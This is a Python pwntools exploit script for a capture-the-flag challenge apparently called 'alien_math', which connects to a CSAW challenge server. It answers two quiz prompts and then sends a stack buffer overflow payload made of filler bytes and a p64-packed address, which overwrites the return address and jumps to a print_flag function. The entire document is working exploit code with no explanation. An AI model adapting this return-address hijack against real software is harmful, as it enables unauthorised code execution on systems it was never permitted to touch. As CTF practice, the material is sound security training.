from pwn import *

BIN = "./alien_math"

print_flag = 0x4014fb

def exploit():
	payload = b"aaaabbbbccccddddeeeeffff" + p64(print_flag)
	# _breakpoint = """
	# 	b*0x00000000004012e4
	# 	"""
	# gdb.attach(io,_breakpoint)
	io.recvuntil("What is the square root of zopnol?")
	io.sendline("1804289383")
	io.recvuntil("How many tewgrunbs are in a qorbnorbf?")
	io.sendline("7856445899213065428791")
	io.recvuntil("How long does it take for a toblob of energy to be transferred between two quantum entangled salwzoblrs?")
	io.sendline(payload)
	io.interactive()


#io = process(BIN)
io = remote("pwn.chal.csaw.io",5004)
context.log_level = 'debug'
exploit()